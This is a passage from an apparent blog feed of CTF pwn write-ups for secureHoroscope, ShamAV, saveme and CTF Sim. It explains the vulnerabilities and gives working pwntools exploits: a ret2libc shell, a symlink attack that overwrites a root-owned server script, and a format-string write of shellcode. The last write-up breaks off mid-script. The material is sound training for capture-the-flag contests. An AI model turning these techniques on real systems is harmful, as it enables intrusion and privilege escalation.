<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">exe = ELF(&quot;secureHoroscope_patched&quot;)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line">libc = ELF(&quot;libc.so.6&quot;)</span><br><span class="line">ld = ELF(&quot;./ld-2.27.so&quot;)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"># context.log_level = &#x27;DEBUG&#x27;</span><br><span class="line"></span><br><span class="line">def log_print(*msg):</span><br><span class="line">    log.info(&quot; &quot;.join(map(str,msg)))</span><br><span class="line"></span><br><span class="line">def start():</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        if args.R2:</span><br><span class="line">            input(&quot;Wait r2 attach&quot;)</span><br><span class="line">    else:</span><br><span class="line">        r = remote(&quot;sechoroscope.sdc.tf&quot;, 1337)</span><br><span class="line">    return r</span><br><span class="line"></span><br><span class="line">ret_addr = exe_rop.find_gadget([&#x27;ret&#x27;])[0]</span><br><span class="line">pop_rdi_ret_addr = exe_rop.find_gadget([&#x27;pop rdi&#x27;, &#x27;ret&#x27;])[0]</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">io.sendlineafter(b&#x27;feel\n&#x27;,b&quot;AAAAA&quot;)</span><br><span class="line"></span><br><span class="line">writable = 0x601900</span><br><span class="line"></span><br><span class="line">print(hex(exe.sym[&quot;puts&quot;]))</span><br><span class="line"># print(hex(exe.got[&quot;puts&quot;]))</span><br><span class="line">input(&quot;wait&quot;)</span><br><span class="line">io.sendlineafter(b&#x27;horoscope\n\n&#x27;,flat(&#123;</span><br><span class="line">    0x70:writable,</span><br><span class="line">    0x70+8:0x004007b9</span><br><span class="line">&#125;))</span><br><span class="line">io.recvuntil(b&quot;business days.\n&quot;)</span><br><span class="line"></span><br><span class="line">input(&quot;wait&quot;)</span><br><span class="line">io.send(flat(&#123;</span><br><span class="line">    0:[</span><br><span class="line">        writable-0x70 + 0x8*5,# new rbp</span><br><span class="line">        pop_rdi_ret_addr,</span><br><span class="line">        exe.got[&quot;puts&quot;],</span><br><span class="line">        exe.sym[&quot;puts&quot;],</span><br><span class="line">        0x004007fd, # fflush, leave ret</span><br><span class="line">        writable-0x70 + 0x8*5 +0x8 + 0x70, # rbp</span><br><span class="line">        0x004007cf,</span><br><span class="line">    ],</span><br><span class="line">    0x70:writable-0x70,</span><br><span class="line">    0x70+8:0x0040080d # leave ret</span><br><span class="line">&#125;))</span><br><span class="line">io.recvuntil(b&quot;business days.\n&quot;)</span><br><span class="line">libc.address = int.from_bytes(io.recvuntil(b&quot;\n&quot;,drop=True),&quot;little&quot;) - libc.sym[&quot;puts&quot;]</span><br><span class="line">log_print(&quot;base libc addr&quot;,hex(libc.address))</span><br><span class="line">input(&quot;wait&quot;)</span><br><span class="line">io.send(flat(&#123;</span><br><span class="line">    0:[</span><br><span class="line">        pop_rdi_ret_addr,</span><br><span class="line">        next(libc.search(b&quot;/bin/sh&quot;)),</span><br><span class="line">        libc.sym[&quot;system&quot;]</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">&#125;))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>sdctf{Th0s3_d4rN_P15C3s_g0t_m3}</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] ShamAV [SDCTF 2022]</title>
    <url>/ctf-writeup/2022/sdctf/pwn/shamav/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>We just developed a new anti-virus called ShamAV. Have fun!</p>
<p>Connect via<br>socat FILE:<code>tty</code>,raw,echo&#x3D;0 TCP:shamav.sdc.tf:1337</p>
<p>Flag path (Unix permission of flag is intended)<br>&#x2F;home&#x2F;antivirus&#x2F;flag.txt</p>
<p>Note<br>Ignore directory &#x2F;home&#x2F;user, you don&#39;t need to access anything under it to get the flag<br>By k3v1n</p>
<h1 id="0x1-Vulnerability"><a href="#0x1-Vulnerability" class="headerlink" title="0x1 Vulnerability"></a>0x1 Vulnerability</h1><p>this challenge is basically manipulating with symbolic links. </p>
<p>First bug is <code>os.lstat(path).st_uid != USER_UID</code> in <code>server.py</code>.</p>
<p>According to man page, <code>lstate()</code> will return the property of symbolic not the real file. </p>
<blockquote>
<p>lstat() is identical to stat(), except that if pathname is a symbolic link, then it returns information about the link itself, not the file that the link refers to.</p>
</blockquote>
<p>We can bypass this check by creating a symbolic link to the file that is not owned by us.</p>
<p>Second vuln is also related to symbolic links</p>
<p>if we have symbolic link point to anther file, overwrite this symbolic link would actually overwrite the real file.</p>
<p>Combine those two vuln, we can get <code>seed</code> first, then predict next filename, create symbolic link point to <code>server.py</code>.</p>
<p>Then, we scan our new file, which will overwrite <code>server.py</code>.</p>
<p>After than, we crash <code>server.py</code>, let <code>launcher.sh</code> to restart <code>server.py</code> and execute our code.</p>
<h1 id="0x3-Walk-through"><a href="#0x3-Walk-through" class="headerlink" title="0x3 Walk through"></a>0x3 Walk through</h1><h2 id="first-glance"><a href="#first-glance" class="headerlink" title="first glance"></a>first glance</h2><p>challenge only provide a host and port, no other thing. But I can get everything I need through the shell.</p>
<p>connect to server, firstly I checked the permission of the flag.txt. flag.txt is owned by antivirus, but didn&#39;t have any permission. So, I need find a way to change the permission and read the flag.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf@SHAMAV:~$ whoami</span><br><span class="line">ctf</span><br><span class="line">ctf@SHAMAV:~$ ls -al /home/antivirus</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 3 antivirus antivirus  200 May 10 04:27 .</span><br><span class="line">drwxr-xr-x 5 nobody    nogroup   4096 May  4 23:22 ..</span><br><span class="line">-rw-r--r-- 1 antivirus antivirus  697 May 10 04:27 av.log</span><br><span class="line">---------- 1 antivirus antivirus   44 May 10 04:27 flag.txt</span><br><span class="line">-rwxr-xr-x 1 antivirus antivirus  673 May 10 04:27 launcher.sh</span><br><span class="line">-rw-r--r-- 1 antivirus antivirus  260 May 10 04:27 malware-hashes.txt</span><br><span class="line">drwxrwxrwx 2 antivirus antivirus   40 May 10 04:27 quarantine</span><br><span class="line">-rw------- 1 antivirus antivirus   45 May 10 04:27 seed</span><br><span class="line">-rwxr-xr-x 1 antivirus antivirus 2643 May 10 04:27 server.py</span><br><span class="line">srwxrwxrwx 1 antivirus antivirus    0 May 10 04:27 socket</span><br></pre></td></tr></table></figure>

<p>then I looked at the <code>scan</code> file under &#x2F;home&#x2F;ctf&#x2F;bin. uhhh, its just a script, and how <code>scan</code> works is sending file path to a socket, then retrieve result from that socket. </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># basically this file</span></span><br><span class="line">(<span class="built_in">echo</span> -n <span class="string">&quot;file_path&quot;</span> | socat - <span class="string">&quot;UNIX-CONNECT:/home/antivirus/socket&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>if we scan a file, the file will be copy to <code>/home/antivirus/quarantine</code> with a random generated name. Moreover, this file is owned by <code>antivirus</code>!</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf@SHAMAV:~/virus-samples$ scan phishing.py</span><br><span class="line">ctf@SHAMAV:~/virus-samples$ ls -al /home/antivirus/quarantine</span><br><span class="line">total 4</span><br><span class="line">drwxrwxrwx 2 antivirus antivirus  60 May 10 04:37 .</span><br><span class="line">drwxr-xr-x 3 antivirus antivirus 200 May 10 04:27 ..</span><br><span class="line">-rw-r--r-- 1 antivirus antivirus 177 May 10 04:37 sham-av-8a8b989c85011653db080d7e26f7175c04a9772c5845884a2e86c42fb3f17df6</span><br></pre></td></tr></table></figure>

<h2 id="analysis"><a href="#analysis" class="headerlink" title="analysis"></a>analysis</h2><p>lets analysis two file that are responsible for the antivirus system. <a href="server.py"><code>server.py</code></a> and <a href="launcher.sh"><code>launcher.sh</code></a></p>
<p><strong><a href="server.py">server.py</a></strong></p>
<ul>
<li>check if file is owned by <code>ctf</code>, <code>os.lstat(path).st_uid != USER_UID</code></li>
<li>copy file to <code>/home/antivirus/quarantine</code> using <code>shutil.copyfile(path, target_path)</code>. target name is determined by a seed</li>
</ul>
<p>the check can be easily bypassed by creating a symbolic link as i mentioned in the vulnerability section</p>
<p><strong><a href="launcher.sh">launcher.sh</a></strong></p>
<ul>
<li>start server.py</li>
<li>restart server.py if server.py crash.</li>
</ul>
<p>filename is generate by following function, so if I know the seed, I can predict the filename that will be generated in the future.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">genrandom</span>():</span><br><span class="line">    <span class="keyword">global</span> ctr</span><br><span class="line">    result = hashlib.sha256(ctr.to_bytes(CTR_LENGTH, byteorder=<span class="string">&#x27;little&#x27;</span>) + seed).hexdigest()</span><br><span class="line">    ctr += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<h2 id="the-idea"><a href="#the-idea" class="headerlink" title="the idea"></a>the idea</h2><p>I come up with following basic idea</p>
<ol>
<li>modify <code>server.py</code> so that it execute <code>chmod 777 flag.txt</code></li>
<li>find way to crash <code>server.py</code></li>
<li><code>launcher.sh</code> will execute <code>chmod 777 flag.txt</code> and I can cat flag</li>
</ol>
<p>crash <code>server.py</code> is pretty easy, we create a symlink to <code>flag.txt</code>, and pass <code>flag.txt</code> to the server. since <code>flag.txt</code> is not readable, the program will throw an exception and crash.</p>
<p>modify <code>server.py</code> is bit tricky. </p>
<p>In server.py, we have <code>shutil.copyfile(path, target_path)</code> that copy file. If the <code>target_path</code> exists and it is a symbolic link, this will overwrite the real file. Using this, I can overwrite <code>server.py</code></p>
<p>But how can i predict the filename, I need seed to do that. </p>
<p>Obtain <code>seed</code> is also easy.</p>
<p>although ctf user don&#39;t have read permission on <code>seed</code> file, I can &quot;scan&quot; <code>seed</code> file and obtain seed from the file copied by <code>server.py</code></p>
<h2 id="final-idea"><a href="#final-idea" class="headerlink" title="final idea"></a>final idea</h2><ol>
<li>create symlink to <code>seed</code>, send <code>seed</code> to server and get seed</li>
<li>predict next filename, create symlink point to <code>server.py</code> using that name</li>
<li>create a file and execute <code>chmod 777 flag.txt</code>, scan this file and overwrite <code>server.py</code></li>
<li>create symlink to <code>flag.txt</code>, send <code>flag.txt</code> to server and crash the server</li>
<li><code>launcher.sh</code> will execute code and I can cat flag.</li>
</ol>
<h1 id="0x4-Exploit"><a href="#0x4-Exploit" class="headerlink" title="0x4 Exploit"></a>0x4 Exploit</h1><p>file_name_predict.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64, socket, os, hashlib, shutil, sys</span><br><span class="line">USER_UID = <span class="number">1002</span></span><br><span class="line">CTR_LENGTH = <span class="number">256</span></span><br><span class="line">STDIO_DEBUG = <span class="literal">False</span></span><br><span class="line">seed = <span class="string">&quot;ZFhtPShqL2BjJQw7MwAPBjEwMolJ6qndj4v9v+2vEK8=&quot;</span> <span class="comment"># seed from seed file</span></span><br><span class="line">ctr = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">seed = base64.b64decode(seed)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genrandom</span>():</span><br><span class="line">    <span class="keyword">global</span> ctr</span><br><span class="line">    result = hashlib.sha256(ctr.to_bytes(CTR_LENGTH, byteorder=<span class="string">&#x27;little&#x27;</span>) + seed).hexdigest()</span><br><span class="line">    ctr += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;/home/antivirus/quarantine/sham-av-<span class="subst">&#123;genrandom()&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;/home/antivirus/quarantine/sham-av-<span class="subst">&#123;genrandom()&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;/home/antivirus/quarantine/sham-av-<span class="subst">&#123;genrandom()&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>exploit</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /home/antivirus/seed /home/ctf/seed</span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;/home/ctf/seed&quot;</span> | socat - <span class="string">&quot;UNIX-CONNECT:/home/antivirus/socket&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ln</span> -s /home/antivirus/server.py /home/antivirus/quarantine/sham-av-b5d2c8eb62cf9108369b50d1f4a5928821b2e28f3b5606009285a502c96c1a8f <span class="comment"># the predict filename</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;#! /usr/bin/env python3\nimport os\nos.system(&#x27;chmod 777 flag.txt&#x27;)&quot;</span> &gt; /home/ctf/x</span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;/home/ctf/x&quot;</span> | socat - <span class="string">&quot;UNIX-CONNECT:/home/antivirus/socket&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> -al /home/antivirus/quarantine</span><br><span class="line"><span class="built_in">cat</span> /home/antivirus/server.py</span><br><span class="line"></span><br><span class="line"><span class="built_in">ln</span> -s /home/antivirus/flag.txt /home/ctf/flag.txt</span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;/home/ctf/flag.txt&quot;</span> | socat - <span class="string">&quot;UNIX-CONNECT:/home/antivirus/socket&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> -al /home/antivirus/</span><br><span class="line"><span class="built_in">cat</span> /home/antivirus/flag.txt</span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>sdctf{5ymL1Nks_ar3_4_curs3d_f3a7uRe_0f_*NIX}</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] saveme [SekaiCTF 2022]</title>
    <url>/ctf-writeup/2022/sekaictf/pwn/saveme/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>I got lost in my memory. Please save me!</p>
<p>Author: Jonathan</p>
<p>nc challs.ctf.sekai.team 4001</p>
<p>files: <a href="saveme.zip">saveme.zip</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fc000)</span><br></pre></td></tr></table></figure>

<h1 id="0x2-My-approach"><a href="#0x2-My-approach" class="headerlink" title="0x2 My approach"></a>0x2 My approach</h1><p>First of all lets analysis the program. </p>
<p>the first thing that caught my eye is that the program uses <code>seccomp</code> to add restriction to certain system calls. We can easily check the the seccomp rules by using a tool called <code>seccomp-tools</code>.</p>
<p><img data-src="/ctf-writeup/2022/sekaictf/pwn/saveme/2022-10-03_235754.png" alt="2022-10-03_235754.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">23:55:55 $ seccomp-tools dump ./saveme </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0008</span><br><span class="line"> 0007: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<p>The seccomp here check both <code>ARCH_X86_64</code> and <code>A &lt; 0x40000000</code>, which means we are not able to use x32 ABI or use <code>retf</code> to bypass this restriction.</p>
<p>As we can see here, seccomp only allow us to use <code>read</code>, <code>write</code>, and <code>exit_group</code>. There is no way we can get a shell from this. </p>
<p>But luckily, the program already have the flag store in the memory and allocate a <code>rwx</code> memory space. if we are able to get the address of flag and have an arbitray code execution, we can print out the flag using <code>write</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0040129f      mmap(0x405000, 0x1000, 7, 0x22, 0, 0);</span><br><span class="line">...</span><br><span class="line">0040137f      int64_t rax_2 = malloc(0x50);</span><br><span class="line">00401399      int32_t rax_4 = open(&quot;flag.txt&quot;, 0);</span><br></pre></td></tr></table></figure>

<p>now come to the main vulnerabilities. </p>
<ol>
<li>the program leak the stack address</li>
<li>we have a printf that printf whatever user have input.</li>
</ol>
<p>these two vulnerabilities give us an arbitrary write on the whole memory space. Since the program also leak the stack address, we can also overwrite rip to control the return pointer.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401424      void var_68;</span><br><span class="line">...</span><br><span class="line">00401476      printf(&quot;| Here is your gift: %p         …&quot;, &amp;var_68);</span><br><span class="line">...</span><br><span class="line">004014d6      else if (rax_6 == 2)</span><br><span class="line">004014d2      &#123;</span><br><span class="line">004014f4          printf(&quot;Please leave note for the next p…&quot;);</span><br><span class="line">0040150c          __isoc99_scanf(&quot;%80s&quot;, &amp;var_68);</span><br><span class="line">0040151d          printf(&amp;var_68);</span><br><span class="line">00401531          putc(0xa, stdout);</span><br><span class="line">00401529      &#125;</span><br></pre></td></tr></table></figure>

<p>looks like we got everything we want. just write shellcode to the executable memory space and return to that.</p>
<p>the idea is correct, but the program have a 80 input length limit, which means we are not able to write the whole shellcode in a single printf. To do that, we need some how make a loop.  so that we can use the <code>printf</code> vulnerability multiple time and write all the shellcode.</p>
<p>my first approach here is write rip to main function. but it didn&#39;t work here. not only because of the stack pointer part, but also the seccomp part. Since the program setup seccomp filter when program execuate main function at first time. Program are not able to use <code>open</code> syscall again. The syscall to <code>open</code> violate the seccomp filter and kill the program immediately.</p>
<p>So, how can we bypass this. the solution is straight forward - <strong>overwrite the return pointer of printf</strong>. Since we have the stack address, we can overwrite the return pointer of printf and let it return to the vulnerability again. In this way, we could write any number of data into the memory space.</p>
<p>finally, when we finish writing shellcode into the memory, we overwrite the return pointer to shellcode itself and get the flag.</p>
<p><em>there is one more thing that need to be considered: since scanf stop scan at <code>\0xa</code> (\n). we need to choose an address that could avoid all <code>\0xa</code> in the final printf payload.</em></p>
<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;saveme&quot;</span>)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wait</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL <span class="keyword">and</span> args.R2:</span><br><span class="line">        <span class="built_in">input</span>(<span class="string">&quot;wait&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_print</span>(<span class="params">*msg</span>):</span><br><span class="line">    log.info(<span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,msg)))</span><br><span class="line">lp = log_print</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.R2:</span><br><span class="line">            <span class="built_in">input</span>(<span class="string">&quot;Wait r2 attach&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">&quot;challs.ctf.sekai.team&quot;</span>, <span class="number">4001</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">ret_addr = exe_rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x004013f4</span></span><br><span class="line">sc_start_addr = <span class="number">0x405030</span> <span class="comment"># use this to avoid 0xa</span></span><br><span class="line"></span><br><span class="line">do_read_shellcode = <span class="string">&#x27;&#x27;</span>.join([</span><br><span class="line">    shellcraft.mov(<span class="string">&quot;rsi&quot;</span>,<span class="number">0x405000</span>),</span><br><span class="line">    shellcraft.read(<span class="number">0</span>, <span class="string">&#x27;rsi&#x27;</span>, <span class="number">0x200</span>),</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">do_read_shellcode = <span class="string">&#x27;\n&#x27;</span>.join([</span><br><span class="line">    <span class="string">&quot;mov rsi,0x405030&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xor rax,rax&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xor rdi,rdi&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mov rdx,0x200&quot;</span>,</span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sc0 = asm(do_read_shellcode)</span><br><span class="line">lp(<span class="string">&quot;first shellcode&quot;</span>,<span class="built_in">hex</span>(<span class="built_in">len</span>(sc0)),do_read_shellcode)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;gift: &quot;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">lp(<span class="string">&#x27;stack leak&#x27;</span>,<span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line">print_flag_shellcode = <span class="string">&quot;\n&quot;</span>.join([</span><br><span class="line">    <span class="string">&quot;mov rdi,0x10&quot;</span>,</span><br><span class="line">    <span class="string">f&quot;mov rax,<span class="subst">&#123;<span class="built_in">hex</span>(exe.plt[<span class="string">&#x27;malloc&#x27;</span>])&#125;</span>&quot;</span>,</span><br><span class="line">    <span class="string">f&quot;call rax&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mov rsi,rax&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mov rdi,0x1410&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sub rsi,rdi&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xor rdi,rdi&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mov rdi,1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mov rdx,0x50&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mov rax,1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;syscall&quot;</span>,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">lp(<span class="string">&quot;print flag shellcode\n&quot;</span>,print_flag_shellcode)</span><br><span class="line">sc1 = asm(print_flag_shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Your option: &quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">payload = fmtstr.fmtstr_payload(<span class="number">8</span>,&#123;</span><br><span class="line">        stack_leak-<span class="number">0x18</span>:<span class="number">0x004014e8</span>,</span><br><span class="line">&#125;,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">lp(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;next person: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">lp(<span class="string">&quot;iteration&quot;</span>,<span class="built_in">len</span>(sc0)//<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sc0)//<span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    payload = fmtstr.fmtstr_payload(<span class="number">8</span>,&#123;</span><br><span class="line">        sc_start_addr+i*<span class="number">2</span>:sc0[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>],</span><br><span class="line">        stack_leak-<span class="number">0x18</span>:<span class="number">0x004014e8</span>,</span><br><span class="line">    &#125;,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = payload + <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">80</span>-<span class="built_in">len</span>(payload)-<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;next person: &#x27;</span>,payload)</span><br><span class="line">    lp(<span class="string">&quot;payload&quot;</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = fmtstr.fmtstr_payload(<span class="number">8</span>,&#123;</span><br><span class="line">    stack_leak-<span class="number">0x18</span>:sc_start_addr,</span><br><span class="line">&#125;,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">lp(<span class="string">f&quot;ret2shellcode payload <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span> <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;next person: &#x27;</span>,payload)</span><br><span class="line">wait()</span><br><span class="line">io.send(sc0+sc1)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>SEKAI{Y0u_g0T_m3_n@w_93e127fc6e3ab73712408a5090fc9a12}</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] CTF Sim [Tamu CTF 2022]</title>
    <url>/ctf-writeup/2022/tamuctf/pwn/ctf_sim/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Author: Lane</p>
<p>Wanna take a break from the ctf to do another ctf?</p>
<p>libc is glibc-2.28 on Debian Buster</p>
<p>SNI: ctf-sim</p>
<p>files: <a href="ctf_sim">ctf_sim</a>, <a href="ctf_sim.cpp">ctf_sim.cpp</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>looking at the code, there is a very trivial dangling pointer in <code>obj.download</code>. After a challenge is deleted, <code>obj.downlaod</code> still have a pointer point to the original heap address.</p>
<p>Thats said, after we free a challenge. we can use <code>submitWriteup</code> to malloc a same lengh of data in the heap, this will return the same address as before.</p>
<p>Then, we can write <code>win_addr</code> into the heap and call <code>solveChallenge</code> again. Then we will successfully enter <code>win</code> function and get a shell.</p>
<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BinaryInfo:</span><br><span class="line">    exe = &quot;ctf_sim&quot;</span><br><span class="line">    libc = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    host = &quot;rua.host.goes.here&quot;</span><br><span class="line">    port = 8000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(BinaryInfo.exe)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line">if BinaryInfo.libc != &quot;&quot;:</span><br><span class="line">    libc = ELF(BinaryInfo.libc)</span><br><span class="line">    libc_rop = ROP(libc)</span><br><span class="line">else:</span><br><span class="line">    libc = None</span><br><span class="line">    libc_rop = None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or BinaryInfo.host</span><br><span class="line">port = int(args.PORT or BinaryInfo.port)</span><br><span class="line"></span><br><span 